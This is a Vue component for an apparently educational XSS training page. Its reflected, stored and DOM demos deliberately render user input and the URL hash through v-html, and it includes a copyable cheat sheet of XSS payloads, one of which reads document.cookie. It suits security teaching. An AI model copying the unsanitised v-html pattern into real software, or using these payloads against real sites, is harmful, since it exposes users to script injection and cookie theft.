<template>
  <div class="live-lab-view">
    <div class="page-header">
      <h1>{{ t.liveLab.title }}</h1>
      <p>{{ t.liveLab.subtitle }}</p>
    </div>

    <Card class="warning-card">
      <template #content>
        <div class="warning-banner">
          <i class="pi pi-exclamation-triangle"></i>
          <div>
            <strong>{{ t.liveLab.warning }}</strong>
          </div>
        </div>
      </template>
    </Card>

    <!-- Vulnerable Search Form -->
    <Card class="lab-card">
      <template #content>
        <h2><i class="pi pi-search"></i> {{ t.liveLab.reflectedDemo.title }}</h2>
        <p class="lab-desc">{{ t.liveLab.reflectedDemo.desc }}</p>

        <div class="vulnerable-demo">
          <div class="input-group">
            <InputText v-model="searchQuery" :placeholder="t.liveLab.reflectedDemo.searchPlaceholder" class="vuln-input" />
            <Button :label="t.liveLab.reflectedDemo.searchBtn" icon="pi pi-search" @click="doSearch" severity="danger" />
          </div>

          <div class="result-area" v-if="searchResult">
            <div class="result-label">{{ t.liveLab.reflectedDemo.results }}</div>
            <div class="vulnerable-output" v-html="searchResult"></div>
          </div>
        </div>

        <div class="try-payloads">
          <span>Try these:</span>
          <Button v-for="p in quickPayloads" :key="p.name" :label="p.name" size="small" severity="secondary" outlined @click="searchQuery = p.code" />
        </div>
      </template>
    </Card>

    <!-- Vulnerable Comment Form -->
    <Card class="lab-card">
      <template #content>
        <h2><i class="pi pi-comments"></i> {{ t.liveLab.storedDemo.title }}</h2>
        <p class="lab-desc">{{ t.liveLab.storedDemo.desc }}</p>

        <div class="vulnerable-demo">
          <div class="comment-form">
            <InputText v-model="commentName" :placeholder="t.liveLab.storedDemo.nameLabel" class="name-input" />
            <Textarea v-model="commentText" :placeholder="t.liveLab.storedDemo.commentLabel" rows="3" class="comment-input" />
            <Button :label="t.liveLab.storedDemo.submitBtn" icon="pi pi-send" @click="postComment" severity="danger" />
          </div>

          <div class="comments-list">
            <div class="comment-item" v-for="(comment, i) in comments" :key="i">
              <div class="comment-header">
                <strong v-html="comment.name"></strong>
                <span class="comment-time">{{ comment.time }}</span>
              </div>
              <div class="comment-body" v-html="comment.text"></div>
            </div>
            <div v-if="comments.length === 0" class="no-comments">No comments yet. Be the first!</div>
          </div>
        </div>
      </template>
    </Card>

    <!-- DOM XSS Demo -->
    <Card class="lab-card">
      <template #content>
        <h2><i class="pi pi-code"></i> {{ t.liveLab.domDemo.title }}</h2>
        <p class="lab-desc">{{ t.liveLab.domDemo.desc }}</p>

        <div class="vulnerable-demo">
          <div class="url-demo">
            <code>{{ currentUrl }}#{{ hashValue || 'your_payload_here' }}</code>
            <Button label="Update Hash" icon="pi pi-refresh" @click="updateHash" size="small" />
          </div>
          <InputText v-model="hashValue" placeholder="Enter payload for URL hash" class="hash-input" />

          <div class="result-area" v-if="hashResult">
            <div class="result-label">DOM Output:</div>
            <div class="vulnerable-output" v-html="hashResult"></div>
          </div>
        </div>
      </template>
    </Card>

    <!-- Training Sites -->
    <Card class="sites-card">
      <template #content>
        <h2><i class="pi pi-globe"></i> {{ t.liveLab.trainingSites.title }}</h2>
        <p class="lab-desc">{{ t.liveLab.trainingSites.desc }}</p>

        <div class="sites-grid">
          <a href="https://xss-game.appspot.com/" target="_blank" class="site-item">
            <div class="site-icon google">G</div>
            <div class="site-info">
              <h4>XSS Game by Google</h4>
              <p>6 levels of XSS challenges</p>
            </div>
            <i class="pi pi-external-link"></i>
          </a>

          <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" class="site-item">
            <div class="site-icon portswigger">PS</div>
            <div class="site-info">
              <h4>PortSwigger Web Security</h4>
              <p>Free XSS labs and tutorials</p>
            </div>
            <i class="pi pi-external-link"></i>
          </a>

          <a href="https://owasp.org/www-project-webgoat/" target="_blank" class="site-item">
            <div class="site-icon owasp">OW</div>
            <div class="site-info">
              <h4>OWASP WebGoat</h4>
              <p>Deliberately insecure app for learning</p>
            </div>
            <i class="pi pi-external-link"></i>
          </a>

          <a href="https://pentesterlab.com/" target="_blank" class="site-item">
            <div class="site-icon pentester">PL</div>
            <div class="site-info">
              <h4>PentesterLab</h4>
              <p>Hands-on web penetration testing</p>
            </div>
            <i class="pi pi-external-link"></i>
          </a>

          <a href="https://hackthebox.com/" target="_blank" class="site-item">
            <div class="site-icon htb">HTB</div>
            <div class="site-info">
              <h4>Hack The Box</h4>
              <p>Cybersecurity training platform</p>
            </div>
            <i class="pi pi-external-link"></i>
          </a>

          <a href="https://tryhackme.com/" target="_blank" class="site-item">
            <div class="site-icon thm">THM</div>
            <div class="site-info">
              <h4>TryHackMe</h4>
              <p>Learn cyber security with hands-on exercises</p>
            </div>
            <i class="pi pi-external-link"></i>
          </a>
        </div>
      </template>
    </Card>

    <!-- XSS Payloads Cheatsheet -->
    <Card class="cheatsheet-card">
      <template #content>
        <h2><i class="pi pi-list"></i> {{ t.liveLab.payloadsCheatsheet.title }}</h2>

        <div class="cheatsheet-grid">
          <div class="cheat-item" v-for="cheat in cheatsheet" :key="cheat.name">
            <div class="cheat-header">
              <span class="cheat-name">{{ cheat.name }}</span>
              <Button icon="pi pi-copy" size="small" severity="secondary" text @click="copyPayload(cheat.code)" />
            </div>
            <code>{{ cheat.code }}</code>
          </div>
        </div>
      </template>
    </Card>
  </div>
</template>

<script>
import { ref, onMounted } from 'vue'
import { useToast } from 'primevue/usetoast'

export default {
  props: { t: Object, language: String },
  setup() {
    const toast = useToast()

    // Reflected XSS
    const searchQuery = ref('')
    const searchResult = ref('')

    // Stored XSS
    const commentName = ref('')
    const commentText = ref('')
    const comments = ref([
      { name: 'Admin', text: 'Welcome to the comments!', time: '2 hours ago' },
      { name: 'Test User', text: 'This is a test comment.', time: '1 hour ago' }
    ])

    // DOM XSS
    const hashValue = ref('')
    const hashResult = ref('')
    const currentUrl = ref('')

    const quickPayloads = [
      { name: 'Alert', code: '<img src=x onerror=alert("XSS")>' },
      { name: 'Cookie', code: '<img src=x onerror=alert(document.cookie)>' },
      { name: 'SVG', code: '<svg onload=alert("SVG")>' },
      { name: 'Body', code: '<body onload=alert("Body")>' }
    ]

    const cheatsheet = [
      { name: 'Basic Script', code: '<script>alert(1)</scr' + 'ipt>' },
      { name: 'IMG onerror', code: '<img src=x onerror=alert(1)>' },
      { name: 'SVG onload', code: '<svg onload=alert(1)>' },
      { name: 'Body onload', code: '<body onload=alert(1)>' },
      { name: 'Input autofocus', code: '<input onfocus=alert(1) autofocus>' },
      { name: 'Marquee', code: '<marquee onstart=alert(1)>' },
      { name: 'Details', code: '<details open ontoggle=alert(1)>' },
      { name: 'Audio', code: '<audio src=x onerror=alert(1)>' },
      { name: 'Video', code: '<video src=x onerror=alert(1)>' },
      { name: 'Iframe', code: '<iframe src="javascript:alert(1)">' },
      { name: 'Object', code: '<object data="javascript:alert(1)">' },
      { name: 'Embed', code: '<embed src="javascript:alert(1)">' },
      { name: 'A href', code: '<a href="javascript:alert(1)">Click</a>' },
      { name: 'Form action', code: '<form action="javascript:alert(1)"><input type=submit>' },
      { name: 'Button', code: '<button onclick=alert(1)>Click</button>' },
      { name: 'Event handler', code: '<div onmouseover=alert(1)>Hover me</div>' }
    ]

    const doSearch = () => {
      if (searchQuery.value) {
        searchResult.value = searchQuery.value
      }
    }

    const postComment = () => {
      if (commentName.value && commentText.value) {
        comments.value.unshift({
          name: commentName.value,
          text: commentText.value,
          time: 'Just now'
        })
        commentName.value = ''
        commentText.value = ''
      }
    }

    const updateHash = () => {
      if (hashValue.value) {
        window.location.hash = hashValue.value
        hashResult.value = hashValue.value
      }
    }

    const copyPayload = (code) => {
      navigator.clipboard.writeText(code)
      toast.add({ severity: 'success', summary: 'Copied!', detail: 'Payload copied to clipboard', life: 2000 })
    }

    onMounted(() => {
      currentUrl.value = window.location.origin + window.location.pathname
      if (window.location.hash) {
        hashResult.value = window.location.hash.substring(1)
      }
    })

    return {
      searchQuery, searchResult, doSearch,
      commentName, commentText, comments, postComment,
      hashValue, hashResult, currentUrl, updateHash,
      quickPayloads, cheatsheet, copyPayload
    }
  }
}
</script>

<style scoped>
.live-lab-view {
  max-width: 1200px;
  margin: 0 auto;
}

.page-header {
  text-align: center;
  margin-bottom: 2rem;
}

.page-header h1 {
  font-size: 2.5rem;
  margin-bottom: 0.5rem;
}

.warning-card {
  margin-bottom: 1.5rem;
  background: rgba(239, 68, 68, 0.1);
  border: 2px solid #ef4444;
}

.warning-banner {
  display: flex;
  align-items: center;
  gap: 1rem;
  color: #ef4444;
}

.warning-banner i {
  font-size: 2rem;
}

.warning-banner strong {
  display: block;
  font-size: 1.1rem;
}

.warning-banner p {
  margin: 0;
  opacity: 0.9;
}

.lab-card, .sites-card, .cheatsheet-card {
  margin-bottom: 1.5rem;
}

.lab-card h2, .sites-card h2, .cheatsheet-card h2 {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  margin-bottom: 0.5rem;
}

.lab-card h2 i { color: #ef4444; }
.sites-card h2 i { color: #3b82f6; }
.cheatsheet-card h2 i { color: #8b5cf6; }

.lab-desc {
  color: var(--text-secondary);
  margin-bottom: 1.5rem;
}

.vulnerable-demo {
  background: var(--bg-primary);
  padding: 1.5rem;
  border-radius: 12px;
  border: 2px dashed #ef4444;
}

.input-group {
  display: flex;
  gap: 0.75rem;
  margin-bottom: 1rem;
}

.vuln-input, .hash-input {
  flex: 1;
  font-family: monospace;
}

.result-area {
  margin-top: 1rem;
  padding: 1rem;
  background: var(--bg-secondary);
  border-radius: 8px;
}

.result-label {
  font-size: 0.85rem;
  color: var(--text-secondary);
  margin-bottom: 0.5rem;
}

.vulnerable-output {
  padding: 0.75rem;
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid #ef4444;
  border-radius: 6px;
  min-height: 40px;
}

.try-payloads {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  margin-top: 1rem;
  flex-wrap: wrap;
}

.try-payloads span {
  color: var(--text-secondary);
  font-size: 0.9rem;
}

.comment-form {
  display: flex;
  flex-direction: column;
  gap: 0.75rem;
  margin-bottom: 1.5rem;
}

.name-input {
  max-width: 300px;
}

.comments-list {
  max-height: 300px;
  overflow-y: auto;
}

.comment-item {
  padding: 1rem;
  background: var(--bg-secondary);
  border-radius: 8px;
  margin-bottom: 0.75rem;
  border-left: 3px solid #ef4444;
}

.comment-header {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.5rem;
}

.comment-time {
  font-size: 0.8rem;
  color: var(--text-secondary);
}

.no-comments {
  text-align: center;
  color: var(--text-secondary);
  padding: 2rem;
}

.url-demo {
  display: flex;
  align-items: center;
  gap: 1rem;
  margin-bottom: 1rem;
  flex-wrap: wrap;
}

.url-demo code {
  flex: 1;
  background: #1e1e2e;
  color: #22c55e;
  padding: 0.75rem;
  border-radius: 6px;
  font-size: 0.85rem;
}

.sites-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 1rem;
}

.site-item {
  display: flex;
  align-items: center;
  gap: 1rem;
  padding: 1rem;
  background: var(--bg-primary);
  border-radius: 12px;
  text-decoration: none;
  color: var(--text-primary);
  border: 2px solid var(--border-color);
  transition: all 0.2s;
}

.site-item:hover {
  border-color: #3b82f6;
  transform: translateY(-2px);
}

.site-icon {
  width: 50px;
  height: 50px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: 700;
  color: white;
  font-size: 1rem;
}

.site-icon.google { background: linear-gradient(135deg, #4285f4, #34a853); }
.site-icon.portswigger { background: linear-gradient(135deg, #ff6633, #ff3366); }
.site-icon.owasp { background: linear-gradient(135deg, #000, #333); }
.site-icon.pentester { background: linear-gradient(135deg, #6366f1, #8b5cf6); }
.site-icon.htb { background: linear-gradient(135deg, #9fef00, #1a2332); color: #9fef00; }
.site-icon.thm { background: linear-gradient(135deg, #1c2538, #88cc14); }

.site-info {
  flex: 1;
}

.site-info h4 {
  margin-bottom: 0.25rem;
}

.site-info p {
  font-size: 0.85rem;
  color: var(--text-secondary);
  margin: 0;
}

.site-item .pi-external-link {
  color: var(--text-secondary);
}

.cheatsheet-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 0.75rem;
}

.cheat-item {
  background: var(--bg-primary);
  padding: 0.75rem;
  border-radius: 8px;
  border-left: 3px solid #8b5cf6;
}

.cheat-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 0.5rem;
}

.cheat-name {
  font-weight: 600;
  font-size: 0.85rem;
  color: #8b5cf6;
}

.cheat-item code {
  display: block;
  font-family: 'Monaco', monospace;
  font-size: 0.75rem;
  background: #1e1e2e;
  color: #f97316;
  padding: 0.5rem;
  border-radius: 4px;
  overflow-x: auto;
  white-space: nowrap;
}

@media (max-width: 768px) {
  .page-header h1 {
    font-size: 1.5rem;
  }

  .input-group {
    flex-direction: column;
  }

  .sites-grid {
    grid-template-columns: 1fr;
  }

  .cheatsheet-grid {
    grid-template-columns: 1fr;
  }

  .vulnerable-demo {
    padding: 1rem;
  }

  .url-demo {
    flex-direction: column;
    gap: 0.5rem;
  }

  .url-demo code {
    font-size: 0.7rem;
    word-break: break-all;
    white-space: normal;
  }

  .name-input {
    max-width: 100%;
  }

  .lab-card h2,
  .sites-card h2,
  .cheatsheet-card h2 {
    font-size: 1.1rem;
  }

  .lab-desc {
    font-size: 0.85rem;
  }

  .comment-header {
    flex-direction: column;
    gap: 0.25rem;
  }

  .site-item {
    padding: 0.75rem;
  }

  .site-icon {
    width: 40px;
    height: 40px;
    font-size: 0.85rem;
  }

  .site-info h4 {
    font-size: 0.9rem;
  }

  .site-info p {
    font-size: 0.75rem;
  }

  .cheat-item code {
    font-size: 0.65rem;
  }

  .warning-banner i {
    font-size: 1.5rem;
  }

  .warning-banner strong {
    font-size: 0.95rem;
  }
}

@media (max-width: 480px) {
  .page-header h1 {
    font-size: 1.2rem;
  }

  .vulnerable-demo {
    padding: 0.75rem;
  }

  .try-payloads {
    flex-direction: column;
    align-items: flex-start;
  }

  .site-icon {
    width: 36px;
    height: 36px;
    font-size: 0.75rem;
    border-radius: 8px;
  }

  .lab-desc {
    font-size: 0.78rem;
  }

  .cheat-name {
    font-size: 0.78rem;
  }

  .cheat-item code {
    font-size: 0.6rem;
  }
}
</style>
